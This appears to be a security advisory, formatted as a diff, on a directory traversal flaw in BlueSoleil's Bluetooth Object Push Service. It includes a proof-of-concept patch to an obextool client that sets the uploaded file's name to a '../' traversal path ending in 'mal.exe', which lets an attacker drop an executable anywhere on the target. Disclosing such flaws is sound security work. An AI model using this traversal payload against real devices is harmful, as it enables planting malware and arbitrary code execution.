@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/12961/info
+
+BlueSoleil is prone to directory traversal attacks during Bluetooth file uploads. The issue exists in the Object Push Service.
+
+This vulnerability may allow an attacker to upload malicious files to arbitrary locations on affected computers over Bluetooth. An attacker can take advantage of the issue to execute arbitrary code by uploading executables to a location on the computer where they will later be executed. 
+
+@@ -316,7 +316,7 @@
+}
+
+filename = argv[1];
+- alias = basename(filename);
++ alias = "../../../../../../../../mal.exe";
+str2ba(argv[2], &bdaddr);
+channel = (argc > 3) ? atoi(argv[3]) : 10;
+
+The modified obextool client may then be used to push a malicious file to a target computer. 
